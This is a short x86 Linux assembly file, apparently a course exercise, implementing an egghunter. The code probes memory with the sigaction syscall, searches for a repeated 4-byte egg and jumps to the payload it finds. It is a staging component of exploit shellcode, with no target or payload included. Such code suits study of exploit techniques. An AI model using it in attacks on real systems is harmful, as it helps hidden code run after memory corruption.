; Egghunter Demo - With Action syscall
; SLAER

global _start:

section .text

_start:
	
	; Cleaup
;	xor eax, eax
	xor edx, edx
;	xor edi, edi

	;setting up page frame
fsetup:
	or dx, 0xfff

next_frame:
	inc dx
	push byte 0x43
	pop ax 
	int 0x80
	test al, 0xf2
	jz fsetup

	; Moving egg to eax if frame is correct
	
	push dword 0x50905090
	pop eax
	mov edi, edx
	scasd
	jnz next_frame
	scasd
	jnz next_frame
	jmp edi
	

